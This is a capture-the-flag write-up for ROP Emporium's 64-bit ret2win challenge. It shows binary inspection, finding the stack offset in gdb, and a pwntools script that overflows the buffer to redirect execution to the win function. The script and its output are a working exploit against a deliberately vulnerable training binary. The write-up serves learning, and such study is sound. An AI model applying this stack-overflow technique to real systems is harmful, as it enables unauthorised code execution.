# ret2win 64 bit

[Access the challenge](https://ropemporium.com/challenge/ret2win.html)
---

```bash
❯ ./ret2win
ret2win by ROP Emporium
x86_64

For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffer!
What could possibly go wrong?
You there, may I have your input please? And don't worry about null bytes, we're using read()!

> hey....
Thank you!

Exiting

```
---

basic file check:

```bash
❯ file ret2win
ret2win: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=19abc0b3bb228157af55b8e16af7316d54ab0597, not stripped
❯ checksec --file=ret2win
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   69 Symbols	  No	0		3		ret2win
╭─ ~/rop/ret2
╰─❯
```

---

radare2 
```bash
❯ r2 -d -A ret2win
WARN: Relocs has not been applied. Please use `-e bin.relocs.apply=true` or `-e bin.cache=true` next time
INFO: Analyze all flags starting with sym. and entry0 (aa)
INFO: Analyze imports (af@@@i)
INFO: Analyze entrypoint (af@ entry0)
INFO: Analyze symbols (af@@@s)
INFO: Recovering variables
INFO: Analyze all functions arguments/locals (afva@@@F)
INFO: Analyze function calls (aac)
INFO: Analyze len bytes of instructions for references (aar)
INFO: Finding and parsing C++ vtables (avrr)
INFO: Analyzing methods
INFO: Recovering local variables (afva)
INFO: Skipping type matching analysis in debugger mode (aaft)
INFO: Propagate noreturn information (aanr)
INFO: Use -AA or aaaa to perform additional experimental analysis
[0x771194f87740]> afl
0x00400550    1      6 sym.imp.puts
0x00400560    1      6 sym.imp.system
0x00400570    1      6 sym.imp.printf
0x00400580    1      6 sym.imp.memset
0x00400590    1      6 sym.imp.read
0x004005a0    1      6 sym.imp.setvbuf
0x004005b0    1     42 entry0
0x004005f0    4     37 sym.deregister_tm_clones
0x00400620    4     55 sym.register_tm_clones
0x00400660    3     29 sym.__do_global_dtors_aux
0x00400690    1      7 sym.frame_dummy
0x004006e8    1    110 sym.pwnme
0x00400756    1     27 sym.ret2win
0x004007f0    1      2 sym.__libc_csu_fini
0x004007f4    1      9 sym._fini
0x00400780    4    101 sym.__libc_csu_init
0x004005e0    1      2 sym._dl_relocate_static_pie
0x00400697    1     81 main
0x00400528    3     23 sym._init
[0x771194f87740]> pdf @main
            ; DATA XREF from entry0 @ 0x4005cd(r)
/ 81: int main (int argc, char **argv, char **envp);
|           0x00400697      55             push rbp
|           0x00400698      4889e5         mov rbp, rsp
|           0x0040069b      488b05b609..   mov rax, qword [obj.stdout] ; obj.__TMC_END__
|                                                                      ; [0x601058:8]=0
|           0x004006a2      b900000000     mov ecx, 0
|           0x004006a7      ba02000000     mov edx, 2
|           0x004006ac      be00000000     mov esi, 0
|           0x004006b1      4889c7         mov rdi, rax
|           0x004006b4      e8e7feffff     call sym.imp.setvbuf        ; int setvbuf(FILE*stream, char *buf, int mode, size_t size)
|           0x004006b9      bf08084000     mov edi, str.ret2win_by_ROP_Emporium ; 0x400808 ; "ret2win by ROP Emporium"
|           0x004006be      e88dfeffff     call sym.imp.puts           ; int puts(const char *s)
|           0x004006c3      bf20084000     mov edi, str.x86_64_n       ; 0x400820 ; "x86_64\n"
|           0x004006c8      e883feffff     call sym.imp.puts           ; int puts(const char *s)
|           0x004006cd      b800000000     mov eax, 0
|           0x004006d2      e811000000     call sym.pwnme
|           0x004006d7      bf28084000     mov edi, str._nExiting      ; 0x400828 ; "\nExiting"
|           0x004006dc      e86ffeffff     call sym.imp.puts           ; int puts(const char *s)
|           0x004006e1      b800000000     mov eax, 0
|           0x004006e6      5d             pop rbp
\           0x004006e7      c3             ret
[0x771194f87740]> pdf @sym.ret2win
/ 27: sym.ret2win ();
|           0x00400756      55             push rbp
|           0x00400757      4889e5         mov rbp, rsp
|           0x0040075a      bf26094000     mov edi, str.Well_done__Heres_your_flag: ; 0x400926 ; "Well done! Here's your flag:"
|           0x0040075f      e8ecfdffff     call sym.imp.puts           ; int puts(const char *s)
|           0x00400764      bf43094000     mov edi, str._bin_cat_flag.txt ; 0x400943 ; "/bin/cat flag.txt"
|           0x00400769      e8f2fdffff     call sym.imp.system         ; int system(const char *string)
|           0x0040076e      90             nop
|           0x0040076f      5d             pop rbp
\           0x00400770      c3             ret
[0x771194f87740]>
```

---

### so we can clearly analyze that. We need to call ret2win function inorder to read the flag.

open the binary in gdb to find the offset

---
```bash
❯ sudo gdb ret2win
[sudo] password for lynk:
GNU gdb (GDB) 14.2
Copyright (C) 2023 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-pc-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<https://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
pwndbg: loaded 160 pwndbg commands and 47 shell commands. Type pwndbg [--shell | --all] [filter] for a list.
pwndbg: created $rebase, $base, $ida GDB functions (can be used with print/break)
Reading symbols from ret2win...
(No debugging symbols found in ret2win)
------- tip of the day (disable with set show-tips off) -------
Use hi to see if a an address belongs to a glibc heap chunk
pwndbg> cyclic 100
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa
pwndbg> run
Starting program: /home/lynk/rop/ret2/ret2win
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/usr/lib/libthread_db.so.1".
ret2win by ROP Emporium
x86_64

For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffer!
What could possibly go wrong?
You there, may I have your input please? And don't worry about null bytes, we're using read()!

> aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa
Thank you!

Program received signal SIGSEGV, Segmentation fault.
0x0000000000400755 in pwnme ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
──────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]───────────────────────────────────────────────────
 RAX  0xb
 RBX  0x7fffffffe248 —▸ 0x7fffffffe505 ◂— '/home/lynk/rop/ret2/ret2win'
 RCX  0x7ffff7eb5504 (write+20) ◂— cmp rax, -0x1000 /* 'H=' */
 RDX  0
 RDI  0x7ffff7f90710 ◂— 0
 RSI  0x7ffff7f8f643 (_IO_2_1_stdout_+131) ◂— 0xf90710000000000a /* '\n' */
 R8   0
 R9   0x7ffff7fcdf40 ◂— endbr64
 R10  0
 R11  0x202
 R12  1
 R13  0
 R14  0x7ffff7ffd000 (_rtld_global) —▸ 0x7ffff7ffe2e0 ◂— 0
 R15  0
 RBP  0x6161616161616165 ('eaaaaaaa')
 RSP  0x7fffffffe118 ◂— 0x6161616161616166 ('faaaaaaa')
 RIP  0x400755 (pwnme+109) ◂— ret
───────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]────────────────────────────────────────────────────────────
 ► 0x400755 <pwnme+109>    ret                                <0x6161616161616166>
    ↓









─────────────────────────────────────────────────────────────────────────[ STACK ]─────────────────────────────────────────────────────────────────────────
00:0000│ rsp 0x7fffffffe118 ◂— 0x6161616161616166 ('faaaaaaa')
01:0008│     0x7fffffffe120 ◂— 0x6161616161616167 ('gaaaaaaa')
02:0010│     0x7fffffffe128 —▸ 0x7ffff7dd1c88 ◂— mov edi, eax
03:0018│     0x7fffffffe130 —▸ 0x7fffffffe170 —▸ 0x7ffff7ffd000 (_rtld_global) —▸ 0x7ffff7ffe2e0 ◂— 0
04:0020│     0x7fffffffe138 —▸ 0x7fffffffe248 —▸ 0x7fffffffe505 ◂— '/home/lynk/rop/ret2/ret2win'
05:0028│     0x7fffffffe140 ◂— 0x100400040 /* '@' */
06:0030│     0x7fffffffe148 —▸ 0x400697 (main) ◂— push rbp
07:0038│     0x7fffffffe150 —▸ 0x7fffffffe248 —▸ 0x7fffffffe505 ◂— '/home/lynk/rop/ret2/ret2win'
───────────────────────────────────────────────────────────────────────[ BACKTRACE ]───────────────────────────────────────────────────────────────────────
 ► 0         0x400755 pwnme+109
   1 0x6161616161616166
   2 0x6161616161616167
   3   0x7ffff7dd1c88
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> haaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa
Undefined command: "haaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa".  Try "help".
pwndbg> cyclic -l faaaaaaa
Finding cyclic pattern of 8 bytes: b'faaaaaaa' (hex: 0x6661616161616161)
Found at offset 40
pwndbg>
```

---

offset = 40

we need address of ret2win function

```bash
pwndbg> info functions
All defined functions:

Non-debugging symbols:
0x0000000000400528  _init
0x0000000000400550  puts@plt
0x0000000000400560  system@plt
0x0000000000400570  printf@plt
0x0000000000400580  memset@plt
0x0000000000400590  read@plt
0x00000000004005a0  setvbuf@plt
0x00000000004005b0  _start
0x00000000004005e0  _dl_relocate_static_pie
0x00000000004005f0  deregister_tm_clones
0x0000000000400620  register_tm_clones
0x0000000000400660  __do_global_dtors_aux
0x0000000000400690  frame_dummy
0x0000000000400697  main
0x00000000004006e8  pwnme
0x0000000000400756  ret2win
0x0000000000400780  __libc_csu_init
0x00000000004007f0  __libc_csu_fini
0x00000000004007f4  _fini
pwndbg>
```
---

Address of ret2win = 0x0000000000400756

---

Now let's craft the exploit.

---

```python
from pwn import *

context.binary = binary = "./ret2win"

# the stack need 16-byte aligned before returning to GLIBC functions such as printf() or system()
#payload =  offset + return address + ret2win function
payload = b'A' * 40 + p64(0x00000000004006e7) + p64(0x0000000000400756)

p = process()

p.sendlineafter(b'>', payload)

p.interactive()
```

---

Running the exploit...

---
```bash
❯ python3 exp.py
[*] '/home/lynk/rop/ret2/ret2win'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Starting local process '/home/lynk/rop/ret2/ret2win': pid 17941
[*] Switching to interactive mode
 [*] Process '/home/lynk/rop/ret2/ret2win' stopped with exit code 0 (pid 17941)
Thank you!
Well done! Here's your flag:
ROPE{a_placeholder_32byte_flag!}
[*] Got EOF while reading in interactive
$
```
---

